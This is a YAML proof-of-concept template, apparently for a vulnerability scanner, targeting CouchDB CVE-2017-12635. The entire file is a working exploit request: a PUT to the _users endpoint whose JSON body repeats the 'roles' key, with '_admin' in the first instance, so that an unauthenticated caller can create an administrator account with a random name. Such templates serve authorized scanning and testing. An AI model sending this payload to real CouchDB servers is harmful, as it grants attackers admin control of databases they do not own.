detail:
  author: j4ckzh0u(https://github.com/j4ckzh0u)
  links:
  - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635
expression: r0()
manual: true
name: poc-yaml-couchdb-cve-2017-12635
rules:
  r0:
    expression: response.status == 201 && response.body.bcontains(bytes("org.couchdb.user:"
      + r1))
    request:
      body: "{\n  \"type\": \"user\",\n  \"name\": \"{{r1}}\",\n  \"roles\": [\"_admin\"\
        ],\n  \"roles\": [],\n  \"password\": \"fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9\"\
        \n}"
      cache: true
      follow_redirects: false
      headers:
        Content-Length: '192'
        Content-Type: application/json
      method: PUT
      path: /_users/org.couchdb.user:{{r1}}
set:
  r1: randomLowercase(32)
transport: http
